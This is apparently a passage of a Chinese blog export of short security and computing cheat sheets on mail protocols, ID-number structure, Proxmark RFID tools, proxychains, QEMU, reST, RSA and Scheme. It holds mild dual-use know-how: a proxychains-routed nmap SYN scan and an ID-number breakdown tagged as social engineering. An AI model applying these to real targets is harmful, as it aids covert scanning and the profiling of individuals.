<h2 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h2><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>手机号与身份证号的秘密</title>
    <url>/2018/05/09/phone-number-and-id-card/</url>
    <content><![CDATA[<h2 id="手机号码"><a href="#手机号码" class="headerlink" title="手机号码"></a>手机号码</h2><p>国内手机号码为 11 位数，按照各部分编码的含义可以分为 3 段：前 3 位是网络识别号，用以标识一个通信运营商；第 4-7 位是地区编码，由 HLR 归属位置寄存器确定；第 8-11 位是用户号码，此段随机分配。</p>
<h2 id="身份证号码"><a href="#身份证号码" class="headerlink" title="身份证号码"></a>身份证号码</h2><p>国内居民身份证号码为 18 位数，按照各部分编码的含义可以分为 4 段：前 6 位是地址码，即编码对象常住户口所在县的行政区划代码，其中第 1-2 位表示省，第 3-4 位表示市，第 5-6 位表示县；第 7-14 位是出生日期码；第 15-17 位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第 17 位奇数分给男性，偶数分给女性；第 18 位是校验码，根据前面 17 位数字码，按照如下算法计算出来的：</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>POP3、IMAP 和 SMTP</title>
    <url>/2020/12/29/pop3-imap-smtp/</url>
    <content><![CDATA[<p>因特网电子邮件系统由 3 个主要部分组成：</p>
<ul>
<li><strong>用户代理</strong>（user agent）：允许用户阅读、回复、转发、保存和撰写报文，如微软的 Outlook 和 Apple Mail 等</li>
<li><strong>邮件服务器</strong>（mail server）：每个接收方在其中的某个邮件服务器上有一个邮箱（mailbox）</li>
<li><strong>SMTP</strong></li>
</ul>
<p>一个典型的邮件发送过程是：从发送方的用户代理开始，传输到发送方的邮件服务器（通过 SMTP 或 HTTP），再传输到接收方的邮件服务器（通过 SMTP），然后在这里被分发到接收方的邮箱中。如果发送方的邮件服务器不能将邮件交付给接收方的邮件服务器，发送方的邮件服务器在一个<strong>报文队列</strong>（message queue）中保持该报文并在以后尝试再次发送。</p>
<span id="more"></span>

<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><p><strong>SMTP</strong>（Simple Mail Transfer Protocol，<strong>简单邮件传输协议</strong>）是因特网电子邮件中主要的应用层协议。它使用 TCP 可靠数据传输服务，从发送方的邮件服务器向接收方的邮件服务器发送邮件。每台邮件服务器既运行 SMTP 的客户端也运行 SMTP 的服务器端。</p>
<p>SMTP 一般不使用中间邮件服务器发送邮件。</p>
<p>SMTP 是如何将一个报文从发送邮件服务器传送到接收邮件服务器的呢？首先，客户 SMTP（运行在发送邮件服务器主机上）在 <strong>25</strong> 号端口建立一个到服务器 SMTP（运行在接收邮件服务器主机上）的 TCP 连接。如果服务器没有开机，客户会在稍后继续尝试连接。一旦连接建立，服务器和客户执行某些应用层的握手。在 SMTP 握手的阶段，SMTP 客户指示发送方的邮件地址（产生报文的那个人）和接收方的邮件地址。一旦握手完成，客户发送该报文。该客户如果有另外的报文要发送到该服务器，就在该相同的 TCP 连接上重复这种处理；否则，它指示 TCP 关闭连接。以下是一个例子（S 代表 SMTP 服务器，C 代表 SMTP 客户）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S: 220 hamburger.edu</span><br><span class="line">C: HELO crepes.fr</span><br><span class="line">S: 250 Hello crepes.fr, pleased to meet you</span><br><span class="line">C: MAIL FROM: &lt;alice@crepes.fr&gt;</span><br><span class="line">S: 250 alice@crepes.fr ... Sender ok</span><br><span class="line">C: RCPT TO: &lt;bob@hamburger.edu&gt;</span><br><span class="line">S: 250 bob@hamburger.edu ... Recipient ok</span><br><span class="line">C: DATA</span><br><span class="line">S: 354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">C: Do you like ketchup?</span><br><span class="line">C: How about pickles?</span><br><span class="line">C: .</span><br><span class="line">S: 250 Message accepted for delivery</span><br><span class="line">C: QUIT</span><br><span class="line">S: 221 hamburger.edu closing connection</span><br></pre></td></tr></table></figure>

<p>在上例中，该客户发送了 5 条命令：<code>HELO</code>（是 HELLO 的缩写）、<code>MAIL FROM</code>、<code>RCPT TO</code>、<code>DATA</code> 以及 <code>QUIT</code>。</p>
<p>当然，你也可以使用 Telnet 直接与一个 SMTP 服务器对话，如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">telnet smtp.office365.com 25</span><br></pre></td></tr></table></figure>

<h3 id="与-HTTP-的对比"><a href="#与-HTTP-的对比" class="headerlink" title="与 HTTP 的对比"></a>与 HTTP 的对比</h3><p>SMTP 与 HTTP 有一些共同的特征：</p>
<ul>
<li>这两个协议都用于从一台主机向另一台主机传送文件</li>
<li>当进行文件传送时，持续的 HTTP 和 SMTP 都使用持续连接</li>
</ul>
<p>然而，两者之间也有一些重要的区别：</p>
<p>首先，HTTP 主要是一个<strong>拉协议</strong>（pull protocol），即在方便的时候，某些人在 Web 服务器上装载信息，用户使用 HTTP 从该服务器拉取这些信息。特别是 TCP 连接是由想接收文件的机器发起的。另一方面，SMTP 基本上是一个<strong>推协议</strong>（push protocol），即发送邮件服务器把文件推向接收邮件服务器。特别是，这个 TCP 连接是由发送该文件的机器发起的。</p>
<p>第二个区别是由于问世较早， SMTP 要求每个报文（包括它们的体）采用 7 比特 ASCII 码格式。如果某报文包含了非 7 比特 ASCII 字符（如具有重音的法文字符）或二进制数据（如图形文件），则该报文必须按照 7 比特 ASCII 码进行编码。HTTP 数据则不受这种限制。</p>
<p>第三个重要区别是如何处理一个既包含文本又包含图形（也可能是其他媒体类型）的文档。HTTP 把每个对象封装到它自己的 HTTP 响应报文中，而 SMTP 则把所有报文对象放在一个报文之中。</p>
<h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><p>如同 HTTP 协议，邮件报文也有相应的邮件首部行，每个首部行包含了可读的文本，是由关键词后跟冒号及其值组成的。某些关键词是必须的，另一些则是可选的。每个首部 <em>必须</em> 含有一个 <code>From:</code> 首部行和一个 <code>To:</code> 首部行；一个首部 <em>也许</em> 包含一个 <code>Subject:</code> 首部行以及其他可选的首部行。</p>
<p>一个典型的报文首部看看起来如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From: alice@crepes.fr</span><br><span class="line">To: bob@hamburger.edu</span><br><span class="line">Subject: Searching for the meaning of life.</span><br></pre></td></tr></table></figure>

<h2 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h2><p><strong>POP3</strong>（Post Office Protocol——Version 3，<strong>第三版的邮局协议</strong>）是一个极为简单的邮件访问协议。</p>
<p>当用户代理（客户）打开了一个到邮件服务器（服务器）端口 <strong>110</strong> 上的 TCP 连接后，POP3 就开始工作了。随着建立 TCP 连接，POP3 按照 3 个阶段进行工作：</p>
<ol>
<li><strong>特许</strong>（authorization）：用户代理发送（以明文形式）用户名和口令以鉴别用户</li>
<li><strong>事务处理</strong>：用户代理取回报文；同时在这个阶段用户代理还能进行如下操作，对报文做删除标记，取消报文删除标记，以及获取邮件的统计信息</li>
<li><strong>更新</strong>：它出现在客户发出了 quit 命令之后，目的是结束该 POP3 会话；这时，该邮件服务器删除那些被标记为删除的报文</li>
</ol>
<p>在 POP3 的事务处理过程中，用户代理发出一些命令，服务器对每个命令做出回答。回答可能有两种：</p>
<ul>
<li><code>+OK</code>：（有时后面还跟有服务器到客户的数据），被服务器用来指示前面的命令是正常的</li>
<li><code>-ERR</code>：被服务器用来指示前面的命令出现了某些差错</li>
</ul>
<p>特许阶段有两个主要的命令：<code>user &lt;user name&gt;</code> 和 <code>pass &lt;password&gt;</code>。你可以使用 Telnet 进行测试，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet outlook.office365.com 110</span><br><span class="line">+OK The Microsoft Exchange POP3 service is ready.</span><br><span class="line">user bob</span><br><span class="line">+OK</span><br><span class="line">pass hungry</span><br><span class="line">+OK user successfully logged on</span><br></pre></td></tr></table></figure>

<p>在特许阶段以后，用户代理仅使用 4 个命令 <code>list</code>、<code>retr</code>、<code>dele</code> 和 <code>quit</code>。</p>
<p>使用 POP3 的用户代理通常被用户配置为“<strong>下载并删除</strong>”或者“<strong>下载并保留</strong>”方式。POP3 用户代理发出的命令序列取决于用户代理程序被配置为这两种工作方式的哪一种。使用下载并删除方式，用户代理发出 <code>list</code> —— <code>retr</code> —— <code>dele</code> 命令，如下（C 代表客户，S 代表服务器）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C: list</span><br><span class="line">S: 1 498</span><br><span class="line">S: 2 912</span><br><span class="line">S: .</span><br><span class="line">C: retr 1</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 1</span><br><span class="line">C: retr 2</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 2</span><br><span class="line">C: quit</span><br><span class="line">S: +OK POP3 server signing off</span><br></pre></td></tr></table></figure>

<p>使用下载并保留方式，用户代理下载某邮件后，该邮件仍保留在邮件服务器上。</p>
<h2 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h2><p><strong>IMAP</strong>（Internet Mail Access Protocol，<strong>因特网邮件访问协议</strong>）是一个相比 POP3 更强大的邮件访问协议。</p>
<p>相比 POP3，IMAP 协议为用户提供了创建文件夹以及将邮件从一个文件夹移动到另一个文件夹的命令；还为用户提供了在远程文件夹中查询邮件的命令，按指定条件去查询匹配的邮件；它还提供了允许用户代理获取报文某些部分的命令。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>相比于 SMTP，POP3 和 IMAP 等邮件访问协议本质上属于拉协议，在基于 Web 的电子邮件中，则可以通过 HTTP 进行邮件的收发，此时，用户代理就是普通的浏览器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Proxmark 入坑指南</title>
    <url>/2019/12/01/proxmark/</url>
    <content><![CDATA[<p>Proxmark 是 RFID 界的瑞士军刀，请注意，其官网为 <a href="http://www.proxmark.org/">proxmark.org</a>，其他的如 <a href="https://proxmark.com/">proxmark.com</a>、<a href="https://www.proxmark3.com/">proxmark3.com</a> 等，均为第三方商业网站，目前的最新硬件版本是 Proxmark 3。</p>
<span id="more"></span>

<h2 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h2><ul>
<li>Proxmark 3：这是 Proxmark 3 的原始版本，现已过时，不建议购买，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/05.proxmark-3/PM3-Trans.png" alt="Proxmark 3"></p>
<ul>
<li>Proxmark 3 RDV 2：这是 Proxmark 3 的一次升级，又称为 Revision Two（修订第二版），产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/03.proxmark-3-rdv-2/PM3-RDV2-Trans.png" alt="Proxmark 3 RDV 2"></p>
<ul>
<li>Proxmark 3 Easy：这是 Proxmark 3 RDV 2 的廉价版本，专门通过淘宝在中国销售，也是目前淘宝上主要的 Proxmark 3 版本，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/04.proxmark-3-easy/PM3-Easy-Trans.png" alt="Proxmark 3 Easy"></p>
<ul>
<li>Proxmark 3 EVO：这是 Proxmark 3 RDV 2 的一次进化，又称为 Evolution（进化），产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/02.proxmark-3-evo/PM3-Evo-Trans.png" alt="Proxmark 3 EVO"></p>
<ul>
<li>Proxmark 3 RDV 4：这是 Proxmark 3 的最新升级版本，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/01.proxmark-3-rdv4/PM3-RDV4-Trans.png" alt="Proxmark 3 RDV 4"></p>
<h2 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h2><p>Proxmark 只有 2 个官方分销商：<a href="https://lab401.com/">Lab401</a> 和 <a href="https://hackerwarehouse.com/">Hacker Warehouse</a>，当然，你也可以从万能的淘宝上购买。</p>
<p>请注意，淘宝上的版本号并不规范，据我所知，淘宝上的大部分产品都是基于 Proxmark 3 Easy 的国内再次改造版，比如，它们所谓的<strong>“一体机”</strong>实际上是 Proxmark 3 Easy 和 <a href="https://github.com/iceman1001/ChameleonMini-rebooted">ChameleonMini（变色龙）</a>的合体版。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>代理链工具：proxychains</title>
    <url>/2018/10/18/proxychains/</url>
    <content><![CDATA[<p><a href="https://github.com/haad/proxychains">proxychains</a> ，顾名思义，是一种代理链工具，它可以强制任何 Linux 下的命令行应用使用其提供的代理连接到网络。Linux 中有的应用本身并不支持代理，这时便可以使用 proxychains 强制其使用代理。</p>
<span id="more"></span>
<h2 id="安装及使用"><a href="#安装及使用" class="headerlink" title="安装及使用"></a>安装及使用</h2><p>在 Ubuntu 下可以使用 <code>sudo apt install proxychains</code> 直接安装，安装完成后会在 <code>/etc</code> 文件夹下生成 <code>proxychains.conf</code> 配置文件，在这个配置文件中可以配置代理链的工作模式和代理地址等。</p>
<p>proxychains 提供了 3 种代理模式，分别是<strong>动态链</strong>（dynamic_chain）、<strong>严格链</strong>（strict_chain）、<strong>随机链</strong>（random_chain），建议选择动态链。此外，proxychains 默认设置的代理地址为 Tor 的地址，但其实最新版的 Tor 已经更改端口为 9150，用户可以根据自己的需求按照示例格式配置地址。</p>
<p>配置完成后，要使用 proxychains，只需在相应命令前加上 <code>proxychains</code> 即可，例如 <code>proxychains nmap -sS 192.168.1.1</code>，即可强制 nmap 使用 proxychains 中设置的代理进行扫描。</p>
<h2 id="与-proxychains-ng"><a href="#与-proxychains-ng" class="headerlink" title="与 proxychains-ng"></a>与 proxychains-ng</h2><p><a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a> 是 proxychains 的升级版，其中 ng 寓意为 new generation（新一代），目前并不知晓 proxychains-ng 与 proxychains 是否为同一组织开发，但二者的配置与使用极为相似。</p>
<p>在 Ubuntu 下可以使用 <code>sudo apt install proxychains-ng</code> 直接安装，要使用 proxychains-ng，只需在相应命令前加上 <code>proxychains4</code> 即可。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>由于 Windows 与 Linux 的设计哲学不同，Linux 偏向使用命令行，Windows 偏向使用图形界面，所以 proxychains 并未提供 Windows 版。在 Windows 下可以使用另一款代理工具 <a href="https://www.proxifier.com/">Proxifier</a> ，它可以看作是 proxychains 的图形界面版，值得注意的是，Proxifier 是收费的，但你可以免费体验 31 天。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>QEMU小记</title>
    <url>/2019/04/18/qemu/</url>
    <content><![CDATA[<p><a href="https://www.qemu.org/">QEMU</a>是Linux中使用最广的虚拟机，其便于调试的特性也适合于系统开发者。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用<code>sudo apt install qemu</code>即可在Ubuntu中安装QEMU，安装完成后直接输入<code>qemu</code>来验证是否成功安装，如果出错，可再输入<code>qemu-system-i386</code>来验证其是否成功安装，若成功，可建立如下所示的软链接，以方便日后使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</span><br></pre></td></tr></table></figure>

<p>值得注意的是，QEMU的启动需要有图形界面，若未安装图形界面，则会报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Could not initialize SDL(No available video device) - exiting</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>使用QEMU运行一个虚拟机的命令格式为<code>qemu [options] [disk_image]</code>，其中disk_image即硬盘镜像文件。其常用的参数如下：</p>
<ul>
<li><code>-hda file</code>：使用file作为硬盘0的镜像文件。</li>
<li><code>-m megs</code>：设定虚拟内存为megs M字节，默认为128M字节。</li>
<li><code>-smp n</code>：设置为有n个CPU的SMP系统。</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派初体验</title>
    <url>/2018/12/24/raspberry-pi-experience/</url>
    <content><![CDATA[<h2 id="Raspbian"><a href="#Raspbian" class="headerlink" title="Raspbian"></a>Raspbian</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式小记</title>
    <url>/2018/11/12/regex/</url>
    <content><![CDATA[<p><strong>正则表达式</strong>，即<strong>Regular Expression</strong>，直译为<strong>描述某种规则的表达式</strong>，通常被简写为<strong>regex</strong>或<strong>RE</strong>，是指使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul>
<li><code>?</code>：匹配前一个字符0次或1次</li>
<li><code>+</code>：匹配前一个字符1次或多次</li>
<li><code>*</code>：匹配前一个字符0次、1次或多次</li>
<li><code>|</code>：代表选择（即或集），具有最低优先级</li>
<li><code>()</code>：用来定义操作符的范围和优先级</li>
<li><code>[abc]</code>：匹配任何一个列在方括号中的字符，在这个例子中，要么匹配一个a，要么匹配一个b，要么匹配一个c</li>
<li><code>[0-9]</code>：如果在方括号中使用短划线分隔两个字符，表示所有在这两个字符范围内的都可以匹配，在这个例子中，表示匹配所有0到9的数字</li>
<li><code>^</code>：匹配行的开头，如<code>^abc</code>表示匹配以abc开始的一行</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>reStructuredText 小记</title>
    <url>/2018/09/17/restructuredtext/</url>
    <content><![CDATA[<p><strong>reStructuredText</strong> 是一种类似于 Markdown 的轻量标记语言，其含义为“重新构建的文本”，也被简称为 <strong>reST</strong>，文件后缀名为 <code>.rst</code>，是 Python 的 Docutils 项目的一部分，目前 reST 被广泛应用于编写 Python 文档。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一级标题</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">这是二级标题</span><br><span class="line">------------</span><br><span class="line"></span><br><span class="line">这是三级标题</span><br><span class="line">************</span><br></pre></td></tr></table></figure>

<p>reST 使用这种不同的下标表示标题的大小，你可以按照自己的喜好使用不同的下标表示不同的标题，总之，一片文档中从上往下依次出现的第一种下标就表示一级标题，第二种不同于之前出现过的下标就表示二级标题，依次类推，个人喜欢用上面这种形式。</p>
<span id="more"></span>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>和 Markdown 一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 无序列表项</span><br><span class="line">- 无序列表项</span><br><span class="line">- 无序列表项</span><br><span class="line"></span><br><span class="line">1. 有序列表项</span><br><span class="line">2. 有序列表项</span><br><span class="line">3. 有序列表项</span><br></pre></td></tr></table></figure>

<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`Howie&#x27;s Blog &lt;http://howiezhao.com&gt;`_</span><br></pre></td></tr></table></figure>

<h3 id="横线"><a href="#横线" class="headerlink" title="横线"></a>横线</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----</span><br></pre></td></tr></table></figure>

<p>这是一条水平区分线，用 4 个或以上的短横线表示</p>
<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>和传统编程语言一样，reST 使用 <code>\</code> 转义特殊字符。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释以两个点和一个空格开始。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..  这是一行注释</span><br></pre></td></tr></table></figure>

<h2 id="Interpreted-Text-Roles"><a href="#Interpreted-Text-Roles" class="headerlink" title="Interpreted Text Roles"></a>Interpreted Text Roles</h2><p><strong>Interpreted Text Roles</strong>（直译为“<strong>解释文本角色</strong>”）是 reST 中非常重要的一个概念，<strong>Interpreted Text</strong>（解释文本）是指以一对 <code>`</code> 包裹起来的文本，**Role**（角色）是指 interpreted text（解释文本）的显示规则。Interpreted Text（解释文本）的语法为 <code>:role:`text`</code> 或 <code>`text`:role:</code>，功能是根据 <code>role</code>（角色）规则对 <code>text</code>（文本）进行 interprete（解释）。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>和 Markdown 一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*斜体*，等价于 :emphasis:`斜体`</span><br><span class="line">**粗体**，等价于 :strong:`粗体`</span><br></pre></td></tr></table></figure>

<h3 id="单行代码"><a href="#单行代码" class="headerlink" title="单行代码"></a>单行代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">``这里是单行代码``，等价于:literal:`这里是单行代码`</span><br></pre></td></tr></table></figure>

<p>要了解更多 reST 中内置的 roles，可参考 <a href="http://docutils.sourceforge.net/docs/ref/rst/roles.html">Docutils 官方文档</a>。</p>
<p>当然，你也可以按照自己的需求自定义 roles，具体可参考 <a href="http://docutils.sourceforge.net/docs/howto/rst-roles.html">Docutils 官方文档</a>。</p>
<h2 id="Directives"><a href="#Directives" class="headerlink" title="Directives"></a>Directives</h2><p><strong>Directives</strong>（直译为“<strong>指令</strong>”）是 reST 中另一个非常重要的概念，Directive（指令）具有如下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------+-------------------------------+</span><br><span class="line">| &quot;.. &quot; | directive type &quot;::&quot; directive |</span><br><span class="line">+-------+ block                         |</span><br><span class="line">        |                               |</span><br><span class="line">        +-------------------------------+</span><br></pre></td></tr></table></figure>

<p>Directive（指令）以明确的标记开始（两个句点和一个空格），后跟 directive type（指令类型）和两个冒号，统称为“<strong>directive marker（指令标记）</strong>”。directive block（指令块）在 directive marker（指令标记）之后立即开始，并包括所有后续的缩进行。directive block（指令块）分为 arguments（参数），options（选项，即字段列表）和 content（内容，按此顺序），其中任何一个都可能出现。</p>
<h3 id="多行代码"><a href="#多行代码" class="headerlink" title="多行代码"></a>多行代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. code:: python</span><br><span class="line"></span><br><span class="line">  def my_function():</span><br><span class="line">      print(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. image:: picture.png</span><br><span class="line">   :alt: 当图片无法显示时，则显示这里的语句。</span><br></pre></td></tr></table></figure>

<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>要了解更多 reST 中内置的 directives，可参考 <a href="http://docutils.sourceforge.net/docs/ref/rst/directives.html">Docutils 官方文档</a>。</p>
<p>当然，你也可以按照自己的需求自定义 directives，具体可参考 <a href="http://docutils.sourceforge.net/docs/howto/rst-directives.html">Docutils 官方文档</a>。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ol>
<li>在特殊字符与要书写的文字之间加上空格，否则可能无法正常显示</li>
<li>不同段之间加一空行</li>
</ol>
<h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>语言只是一种标准，实现该标准就需要相应的解析器，由于 reST 是 Docutils 项目的一部分，所以 reST 最初的解析器正是由 Docutils 提供的，当你使用 <code>pip install docutils</code> 命令安装 Docutils 之后，可以运行 <code>rst2html &lt;rst file&gt; &lt;html file&gt;</code> 命令，将 reST 文件转换为 HTML 文件。</p>
<p>要了解更多的命令可参考 <a href="http://docutils.sourceforge.net/docs/user/tools.html">Docutils 官方文档</a>。</p>
<h2 id="与-Markdown-相比"><a href="#与-Markdown-相比" class="headerlink" title="与 Markdown 相比"></a>与 Markdown 相比</h2><p>与 Markdown 相比，reST 更具扩展性，特别是 directives 的出现，可以按照需求自定义各种各样的 directives 来扩展 reST。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="http://rst.ninjs.org/">这里</a>有一个在线的 reST 编辑器。</p>
<p>要了解更多关于 reST 的知识可参考 <a href="http://docutils.sourceforge.net/rst.html">Docutils 官方文档</a>，或者 <a href="http://www.sphinx-doc.org/en/master/usage/restructuredtext/index.html">Sphinx 官方文档</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>RSA 加密算法</title>
    <url>/2018/10/18/rsa/</url>
    <content><![CDATA[<p>RSA 加密算法中的 3 个字母分别是由此算法的 3 位发明者：Ron Rivest，Adi Shamir，Leonard Adleman 的姓氏首字母组成的，RSA 加密算法可以说是<strong>现代密码学</strong>中<strong>非对称加密</strong>的一个典型，所谓非对称加密其实就是<strong>公钥用于加密，私钥用于解密</strong>而已。</p>
<p>在介绍 RSA 之前，先要理解一个基本常识，就是几乎所有的现代密码学算法背后都是基于<strong>因数分解难题</strong>发明的，所谓因数分解难题就是指目前没有一个<strong>快速</strong>的计算机算法可以对极大整数做因数分解。</p>
<span id="more"></span>
<h2 id="公钥与私钥"><a href="#公钥与私钥" class="headerlink" title="公钥与私钥"></a>公钥与私钥</h2><p>RSA 加密算法通过如下步骤生成公钥和私钥：</p>
<ol>
<li>随机选择 2 个不相等的质数 $p$ 和 $q$，计算 $p$ 和 $q$ 的乘积 $n$<br>取 $p=61$，$q=53$，则 $n=3233$</li>
<li>计算 $n$ 的欧拉函数 $\phi(n)$<br>$\phi(3233)=60×52=3120$</li>
<li>随机选择一个整数 $e$，条件是 $1&lt;e&lt;\phi(n)$，且 $e$ 与 $\phi(n)$ 互质，并计算 $e$ 对于 $\phi(n)$ 的模反元素 $d$<br>取 $e=17$，$d=2753$</li>
<li>将 $n$ 和 $e$ 封装成公钥，$n$ 和 $d$ 封装成私钥<br>公钥为 $(n, e)$，私钥为 $(n, d)$</li>
</ol>
<h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Scheme的五法十诫</title>
    <url>/2019/08/07/scheme-commandments-and-laws/</url>
    <content><![CDATA[<p>节选自《The Little Schemer》</p>
<h2 id="Scheme-五法"><a href="#Scheme-五法" class="headerlink" title="Scheme 五法"></a>Scheme 五法</h2><h3 id="Scheme-五法之第一法-——-car-之法则"><a href="#Scheme-五法之第一法-——-car-之法则" class="headerlink" title="Scheme 五法之第一法 —— car 之法则"></a>Scheme 五法之第一法 —— car 之法则</h3><p>基本元件 <em>car</em> 仅定义为针对非空列表。</p>
<h3 id="Scheme-五法之第二法-——-cdr-之法则"><a href="#Scheme-五法之第二法-——-cdr-之法则" class="headerlink" title="Scheme 五法之第二法 —— cdr 之法则"></a>Scheme 五法之第二法 —— cdr 之法则</h3><p>基本元件 <em>cdr</em> 仅定义为针对非空列表。任意非空列表的 <em>cdr</em> 总是另一个列表。</p>
<h3 id="Scheme-五法之第三法-——-cons-之法则"><a href="#Scheme-五法之第三法-——-cons-之法则" class="headerlink" title="Scheme 五法之第三法 —— cons 之法则"></a>Scheme 五法之第三法 —— cons 之法则</h3><p>基本元件 <em>cons</em> 需要两个参数。第二个参数必须是一个列表。结果是一个列表。</p>
<h3 id="Scheme-五法之第四法-——-Null-之法则"><a href="#Scheme-五法之第四法-——-Null-之法则" class="headerlink" title="Scheme 五法之第四法 —— Null? 之法则"></a>Scheme 五法之第四法 —— Null? 之法则</h3><p>基本元件 <em>null?</em> 仅定义为针对列表。</p>
<h3 id="Scheme-五法之第五法-——-eq-之法则"><a href="#Scheme-五法之第五法-——-eq-之法则" class="headerlink" title="Scheme 五法之第五法 —— eq? 之法则"></a>Scheme 五法之第五法 —— eq? 之法则</h3><p>基本元件 <em>eq?</em> 需要两个参数。每个参数都必须是一个非数字的原子。</p>
<span id="more"></span>
<h2 id="Scheme十诫"><a href="#Scheme十诫" class="headerlink" title="Scheme十诫"></a>Scheme十诫</h2><h3 id="第一诫"><a href="#第一诫" class="headerlink" title="第一诫"></a>第一诫</h3><p>当对一个原子列表 <em>lat</em> 进行递归调用时，询问两个有关 <em>lat</em> 的问题：*(null? lat)* 和 <strong>else</strong>。</p>
